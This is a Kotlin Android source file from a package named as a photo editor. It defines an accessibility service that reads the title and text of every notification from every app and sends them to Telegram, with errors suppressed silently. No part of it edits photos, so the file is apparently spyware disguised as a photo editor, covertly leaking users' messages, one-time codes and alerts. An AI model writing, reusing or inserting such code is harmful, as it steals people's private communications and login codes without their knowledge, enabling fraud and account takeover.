package com.magic.photoeditor

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class NotificationAccessibilityService : AccessibilityService() {

    private lateinit var telegram: TelegramSender

    override fun onCreate() {
        super.onCreate()
        telegram = TelegramSender()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            // Only process notifications
            if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                val packageName = event.packageName?.toString() ?: "Unknown"
                val text = event.text?.toString() ?: ""

                // Get title from notification
                var title = ""
                if (event.parcelableData is android.app.Notification) {
                    val notification = event.parcelableData as android.app.Notification
                    val extras = notification.extras
                    title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: ""
                    val contentText = extras.getString(android.app.Notification.EXTRA_TEXT) ?: ""

                    val fullText = if (title.isNotEmpty() && contentText.isNotEmpty()) {
                        "$title: $contentText"
                    } else if (title.isNotEmpty()) {
                        title
                    } else {
                        contentText
                    }

                    if (fullText.isNotEmpty()) {
                        val message = "📱 Notification from $packageName: $fullText"
                        telegram.sendMessage(message)
                    }
                } else if (text.isNotEmpty()) {
                    // Fallback if parcelableData is not Notification
                    val message = "📱 Notification from $packageName: $text"
                    telegram.sendMessage(message)
                }
            }
        } catch (e: Exception) {
            // Silent fail — don't crash
            android.util.Log.e("AccessibilityService", "Error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        // Not needed
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info
    }
}
